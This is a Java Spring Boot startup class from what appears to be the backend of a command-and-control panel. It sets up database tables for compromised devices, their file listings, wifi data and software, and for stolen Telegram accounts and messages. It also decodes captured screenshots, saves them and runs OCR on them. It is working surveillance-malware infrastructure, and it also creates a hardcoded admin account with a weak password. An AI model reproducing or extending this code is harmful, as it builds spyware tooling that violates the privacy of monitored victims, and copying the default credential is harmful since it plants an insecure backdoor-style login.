package com.yupi.springbootinit.job;

import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
import com.yupi.springbootinit.mapper.C2DeviceMapper;
import com.yupi.springbootinit.mapper.C2ScreenshotMapper;
import com.yupi.springbootinit.mapper.C2TaskMapper;
import com.yupi.springbootinit.model.entity.C2Device;
import com.yupi.springbootinit.model.entity.C2Screenshot;
import com.yupi.springbootinit.model.entity.C2Task;
import com.yupi.springbootinit.model.entity.User;
import com.yupi.springbootinit.model.enums.UserRoleEnum;
import com.yupi.springbootinit.service.UserService;
import lombok.extern.slf4j.Slf4j;
import org.springframework.boot.CommandLineRunner;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.stereotype.Component;

import javax.annotation.Resource;
import java.io.File;
import java.io.FileOutputStream;
import java.util.Base64;
import java.util.Date;
import java.util.List;

@Component
//@Slf4j
public class C2StartupRunner implements CommandLineRunner {

    private static final org.slf4j.Logger log = org.slf4j.LoggerFactory.getLogger(C2StartupRunner.class);

    @Resource
    private JdbcTemplate jdbcTemplate;

    @Resource
    private C2TaskMapper c2TaskMapper;

    @Resource
    private C2DeviceMapper c2DeviceMapper;

    @Resource
    private C2ScreenshotMapper c2ScreenshotMapper;

    @Resource
    private com.yupi.springbootinit.service.OcrService ocrService;

    @Resource
    private UserService userService;

    @Override
    public void run(String... args) throws Exception {
        log.info("C2StartupRunner starting...");

        // 1. Ensure Table Exists
        try {
            // REMOVED DROP TABLE to prevent data loss on restart
            
            // Create c2_screenshot
            String sql = "CREATE TABLE IF NOT EXISTS c2_screenshot (" +
                    "id BIGINT AUTO_INCREMENT PRIMARY KEY, " +
                    "device_uuid VARCHAR(64), " +
                    "task_id VARCHAR(255), " +
                    "url VARCHAR(1024), " +
                    "create_time DATETIME DEFAULT CURRENT_TIMESTAMP, " +
                    "is_delete TINYINT DEFAULT 0" +
                    ")";
            jdbcTemplate.execute(sql);
            
            // Create c2_file_system_node
            String sqlFile = "CREATE TABLE IF NOT EXISTS c2_file_system_node (" +
                    "id BIGINT AUTO_INCREMENT PRIMARY KEY, " +
                    "device_uuid VARCHAR(64), " +
                    "parent_path VARCHAR(1024), " +
                    "path VARCHAR(1024), " +
                    "name VARCHAR(255), " +
                    "is_directory TINYINT DEFAULT 0, " +
                    "size BIGINT, " +
                    "last_modified DATETIME, " +
                    "create_time DATETIME DEFAULT CURRENT_TIMESTAMP, " +
                    "is_delete TINYINT DEFAULT 0" +
                    ")";
            jdbcTemplate.execute(sqlFile);
            
            // Check if device_uuid column exists, if not add it
            try {
                 jdbcTemplate.execute("SELECT device_uuid FROM c2_screenshot LIMIT 1");
            } catch (Exception e) {
                 jdbcTemplate.execute("ALTER TABLE c2_screenshot ADD COLUMN device_uuid VARCHAR(64)");
                 log.info("Added device_uuid column to c2_screenshot");
            }

            // Check if is_monitor_on column exists in c2_device, if not add it
            try {
                 jdbcTemplate.execute("SELECT is_monitor_on FROM c2_device LIMIT 1");
            } catch (Exception e) {
                 jdbcTemplate.execute("ALTER TABLE c2_device ADD COLUMN is_monitor_on TINYINT DEFAULT 0");
                 log.info("Added is_monitor_on column to c2_device");
            }

            // --- UUID Migration ---
            // Add device_uuid to c2_task
            try {
                 jdbcTemplate.execute("SELECT device_uuid FROM c2_task LIMIT 1");
            } catch (Exception e) {
                 jdbcTemplate.execute("ALTER TABLE c2_task ADD COLUMN device_uuid VARCHAR(64)");
                 log.info("Added device_uuid column to c2_task");
            }
            
            // Add device_uuid to c2_software
            try {
                 jdbcTemplate.execute("SELECT device_uuid FROM c2_software LIMIT 1");
            } catch (Exception e) {
                 jdbcTemplate.execute("ALTER TABLE c2_software ADD COLUMN device_uuid VARCHAR(64)");
                 log.info("Added device_uuid column to c2_software");
            }
            
            // Fix: Check if deviceUuid (camelCase) exists and migrate data to device_uuid (snake_case)
            try {
                jdbcTemplate.execute("SELECT deviceUuid FROM c2_software LIMIT 1");
                log.info("Found deviceUuid column in c2_software, migrating data...");
                jdbcTemplate.execute("UPDATE c2_software SET device_uuid = deviceUuid WHERE (device_uuid IS NULL OR device_uuid = '') AND deviceUuid IS NOT NULL");
                log.info("Migrated data from deviceUuid to device_uuid in c2_software");
            } catch (Exception e) {
                // deviceUuid column does not exist, which is good
            }

            // Add device_uuid to c2_wifi
            try {
                 jdbcTemplate.execute("SELECT device_uuid FROM c2_wifi LIMIT 1");
            } catch (Exception e) {
                 jdbcTemplate.execute("ALTER TABLE c2_wifi ADD COLUMN device_uuid VARCHAR(64)");
                 log.info("Added device_uuid column to c2_wifi");
            }

            // Add data_status to c2_device
            try {
                 jdbcTemplate.execute("SELECT data_status FROM c2_device LIMIT 1");
            } catch (Exception e) {
                 jdbcTemplate.execute("ALTER TABLE c2_device ADD COLUMN data_status VARCHAR(64)");
                 log.info("Added data_status column to c2_device");
            }

            try {
                jdbcTemplate.execute("SELECT deviceUuid FROM c2_wifi LIMIT 1");
                jdbcTemplate.execute("UPDATE c2_wifi SET device_uuid = deviceUuid WHERE (device_uuid IS NULL OR device_uuid = '') AND deviceUuid IS NOT NULL");
                log.info("Migrated data from deviceUuid to device_uuid in c2_wifi");
            } catch (Exception e) {}
            
            // --- Backfill UUIDs (Legacy support, skip if columns missing) ---
            try {
                // MySQL syntax - only run if deviceId exists
                // We'll try to update, but if deviceId is gone, it will fail harmlessly
                jdbcTemplate.execute("UPDATE c2_task t JOIN c2_device d ON t.deviceId = d.id SET t.device_uuid = d.uuid WHERE t.device_uuid IS NULL");
                jdbcTemplate.execute("UPDATE c2_software t JOIN c2_device d ON t.deviceId = d.id SET t.device_uuid = d.uuid WHERE t.device_uuid IS NULL");
                jdbcTemplate.execute("UPDATE c2_wifi t JOIN c2_device d ON t.deviceId = d.id SET t.device_uuid = d.uuid WHERE t.device_uuid IS NULL");
                jdbcTemplate.execute("UPDATE c2_screenshot t JOIN c2_device d ON t.device_id = d.id SET t.device_uuid = d.uuid WHERE t.device_uuid IS NULL");
                log.info("Backfilled device_uuid for existing data");
            } catch (Exception e) {
                // log.warn("Backfill skipped: " + e.getMessage());
            }
            
            // --- Drop deviceId and deviceUuid columns (Cleanup) ---
            String[] tablesToClean = {"c2_task", "c2_software", "c2_wifi"};
            for (String table : tablesToClean) {
                try {
                    jdbcTemplate.execute("ALTER TABLE " + table + " DROP COLUMN deviceId");
                    log.info("Dropped deviceId from " + table);
                } catch (Exception e) {
                    // Ignore if column doesn't exist
                }
                
                try {
                    jdbcTemplate.execute("ALTER TABLE " + table + " DROP COLUMN deviceUuid");
                    log.info("Dropped deviceUuid from " + table);
                } catch (Exception e) {
                    // Ignore if column doesn't exist
                }
            }
            try {
                jdbcTemplate.execute("ALTER TABLE c2_screenshot DROP COLUMN device_id"); // c2_screenshot uses device_id snake_case often, check entity?
                // Entity removed it. DB likely has device_id or deviceId. Try both.
                log.info("Dropped device_id from c2_screenshot");
            } catch (Exception e) {
                 try {
                    jdbcTemplate.execute("ALTER TABLE c2_screenshot DROP COLUMN deviceId");
                 } catch (Exception ex) {}
            }
            
            try {
                jdbcTemplate.execute("ALTER TABLE c2_screenshot DROP COLUMN deviceUuid");
                log.info("Dropped deviceUuid from c2_screenshot");
            } catch (Exception e) {}
            
            // --- TG Schema Migration ---
            
            // Add is_premium to tg_account
            try {
                jdbcTemplate.execute("SELECT is_premium FROM tg_account LIMIT 1");
            } catch (Exception e) {
                try {
                    jdbcTemplate.execute("ALTER TABLE tg_account ADD COLUMN is_premium TINYINT DEFAULT 0");
                    log.info("Added is_premium column to tg_account");
                } catch (Exception ex) {
                    log.warn("Failed to add is_premium to tg_account: " + ex.getMessage());
                }
            }
            
            // Add new fields to tg_message
            String[] newMsgFields = {
                "sender_username", "sender_phone",
                "receiver_id", "receiver_username", "receiver_phone"
            };
            
            for (String field : newMsgFields) {
                try {
                    jdbcTemplate.execute("SELECT " + field + " FROM tg_message LIMIT 1");
                } catch (Exception e) {
                    try {
                        jdbcTemplate.execute("ALTER TABLE tg_message ADD COLUMN " + field + " VARCHAR(255)");
                        log.info("Added " + field + " column to tg_message");
                    } catch (Exception ex) {
                        log.warn("Failed to add " + field + " to tg_message: " + ex.getMessage());
                    }
                }
            }

            log.info("Table schema checked.");
        } catch (Exception e) {
            log.error("Failed to create table c2_screenshot: " + e.getMessage());
        }

        // 1.1 Create Default Admin User
        try {
            QueryWrapper<User> userQuery = new QueryWrapper<>();
            userQuery.eq("user_account", "admin");
            if (userService.count(userQuery) == 0) {
                long userId = userService.userRegister("admin", "12345678", "12345678");
                User user = new User();
                user.setId(userId);
                user.setUserRole(UserRoleEnum.ADMIN.getValue());
                userService.updateById(user);
                log.info("Created default admin user: admin / 12345678");
            }
        } catch (Exception e) {
            log.error("Failed to create default admin user: " + e.getMessage());
        }

        // 2. Sync Old Tasks to Screenshots
        try {
            syncTasksToScreenshots();
        } catch (Exception e) {
            log.error("Failed to sync tasks: " + e.getMessage());
        }
        
        // 3. Scan Uploads Folder to Recover Lost Screenshots (Async to prevent blocking/crashing startup)
        new Thread(() -> {
            try {
                Thread.sleep(5000); // Wait for server to start
                log.info("Starting background scan of uploads folder...");
                scanUploadsFolder();
                log.info("Background scan completed.");
            } catch (Exception e) {
                log.error("Background scan failed", e);
            }
        }).start();
        
        log.info("C2StartupRunner finished.");
    }

    private void scanUploadsFolder() {
        File uploadsDir = new File("uploads");
        if (!uploadsDir.exists() || !uploadsDir.isDirectory()) {
            return;
        }
        
        File[] deviceDirs = uploadsDir.listFiles();
        if (deviceDirs == null) return;
        
        int recoveredCount = 0;
        
        for (File deviceDir : deviceDirs) {
            if (deviceDir.isDirectory()) {
                try {
                    String uuid = deviceDir.getName();
                    File[] images = deviceDir.listFiles((dir, name) -> name.endsWith(".png") || name.endsWith(".jpg"));
                    
                    if (images != null) {
                        for (File image : images) {
                            String filename = image.getName();
                            String url = "/api/c2/download?uuid=" + uuid + "&filename=" + filename;
                            
                            // Check if exists in DB by URL
                            QueryWrapper<C2Screenshot> exists = new QueryWrapper<>();
                            exists.eq("url", url);
                            C2Screenshot existingSc = c2ScreenshotMapper.selectOne(exists);
                            
                            if (existingSc == null) {
                                C2Screenshot sc = new C2Screenshot();
                                sc.setDeviceUuid(uuid);
                                sc.setUrl(url);
                                
                                // Perform OCR
                                try {
                                    String ocrText = ocrService.doOcr(image);
                                    sc.setOcrResult(ocrText);
                                } catch (Exception e) {
                                    log.error("Failed to OCR recovered image: " + filename, e);
                                }
                                
                                // Try to extract timestamp from filename
                                // Format: monitor_123456789.png or screenshot_123456789.png
                                long timestamp = image.lastModified();
                                try {
                                    String[] parts = filename.split("_");
                                    if (parts.length > 1) {
                                        String timePart = parts[1].split("\\.")[0];
                                        // Check if it's a valid timestamp (numeric)
                                        if (timePart.matches("\\d+")) {
                                            timestamp = Long.parseLong(timePart);
                                        }
                                    }
                                } catch (Exception e) {
                                    // Keep file timestamp
                                }
                                sc.setCreateTime(new Date(timestamp));
                                sc.setTaskId("recovered"); // Mark as recovered
                                c2ScreenshotMapper.insert(sc);
                                recoveredCount++;
                            } else {
                                // Update OCR if missing
                                if (existingSc.getOcrResult() == null || existingSc.getOcrResult().trim().isEmpty()) {
                                    try {
                                        String ocrText = ocrService.doOcr(image);
                                        existingSc.setOcrResult(ocrText);
                                        c2ScreenshotMapper.updateById(existingSc);
                                        log.info("Updated OCR for existing screenshot: {}", filename);
                                        recoveredCount++;
                                    } catch (Exception e) {
                                        log.error("Failed to OCR existing recovered image: " + filename, e);
                                    }
                                }
                            }
                        }
                    }
                } catch (Exception e) {
                    // Skip
                }
            }
        }
        log.info("Recovered {} screenshots from disk.", recoveredCount);
    }

    private void syncTasksToScreenshots() {
        // Find all completed screenshot/monitor tasks
        QueryWrapper<C2Task> queryWrapper = new QueryWrapper<>();
        queryWrapper.in("command", "screenshot", "start_monitor");
        // Remove status check to be more inclusive, just check result
        queryWrapper.isNotNull("result");
        
        List<C2Task> tasks = c2TaskMapper.selectList(queryWrapper);
        log.info("Found {} potential screenshot tasks to sync.", tasks.size());

        for (C2Task task : tasks) {
            try {
                // Check if already in c2_screenshot
                QueryWrapper<C2Screenshot> check = new QueryWrapper<>();
                check.eq("task_id", task.getTaskId());
                if (c2ScreenshotMapper.selectCount(check) > 0) {
                    continue;
                }

                String result = task.getResult();
                if (result == null || result.length() < 10) {
                    continue;
                }

                String url = null;

                if (result.startsWith("/api/")) {
                    // Already a URL
                    url = result;
                } else if (!result.startsWith("Monitor started")) {
                    // Likely Base64, need to save to file
                    try {
                        // Clean up base64 prefix if present
                        String base64 = result;
                        if (base64.contains(",")) {
                            base64 = base64.split(",")[1];
                        }
                        // Validate base64 chars roughly
                        if (!base64.matches("^[A-Za-z0-9+/=]+$")) {
                             continue;
                        }
                        
                        byte[] imageBytes = Base64.getDecoder().decode(base64);
                        String filename = "sync_" + System.currentTimeMillis() + "_" + task.getId() + ".png";
                        
                        // Resolve UUID for folder
                        String targetDirName = "unknown";
                        if (task.getDeviceUuid() != null && !task.getDeviceUuid().isEmpty()) {
                            targetDirName = task.getDeviceUuid();
                        }
                        
                        String uploadDir = "uploads/" + targetDirName;
                        File dir = new File(uploadDir);
                        if (!dir.exists()) {
                            dir.mkdirs();
                        }
                        
                        File dest = new File(dir, filename);
                        try (FileOutputStream fos = new FileOutputStream(dest)) {
                            fos.write(imageBytes);
                        }
                        
                        url = "/api/c2/download?uuid=" + targetDirName + "&filename=" + filename;
                        
                        // Update task to save space and point to file
                        task.setResult(url);
                        c2TaskMapper.updateById(task);
                        log.info("Converted Base64 task {} to file {}", task.getTaskId(), filename);
                        
                    } catch (IllegalArgumentException e) {
                        log.warn("Task {} result is not valid base64: {}", task.getTaskId(), e.getMessage());
                        continue;
                    }
                } else {
                     // Monitor started message
                }

                if (url != null) {
                    C2Screenshot screenshot = new C2Screenshot();
                    screenshot.setDeviceUuid(task.getDeviceUuid());
                    screenshot.setTaskId(task.getTaskId());
                    screenshot.setUrl(url);
                    // Use task create time if possible, or now
                    screenshot.setCreateTime(task.getCreateTime() != null ? task.getCreateTime() : new Date());
                    c2ScreenshotMapper.insert(screenshot);
                    log.info("Synced screenshot for task {}", task.getTaskId());
                }

            } catch (Exception e) {
                log.error("Error syncing task {}: {}", task.getId(), e.getMessage());
            }
        }
    }
}
